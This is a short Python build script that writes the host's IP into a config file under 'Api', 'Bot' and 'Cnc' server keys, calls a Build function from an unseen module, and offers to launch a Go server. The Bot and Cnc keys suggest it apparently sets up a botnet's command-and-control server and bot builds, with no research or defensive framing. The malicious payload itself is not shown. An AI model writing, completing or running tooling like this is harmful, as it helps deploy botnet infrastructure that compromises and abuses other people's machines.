import socket
import os
import json
from builder import *


def GetIp() -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(("8.8.8.8", 80))
    return sock.getsockname()[0]


def GenerateConfig(config, ip: str):

    config["Api"]["Server"] = ip
    config["Bot"]["Server"] = ip
    config["Cnc"]["Server"] = ip

    with open("./config.json", "w") as f:
        json.dump(config, f)


if __name__ == "__main__":
    with open("./config.json") as f:
        config = json.load(f)

    ip = GetIp()
    GenerateConfig(config, ip)

    Build(config, "default")
    os.system("rm -r -f __pycache__")

    print("\nSuccess.\nRun the server? [y/n]")
    run = input()

    if run.lower() == "y":
        os.system("screen go run .")
        exit()
    else:
        exit()
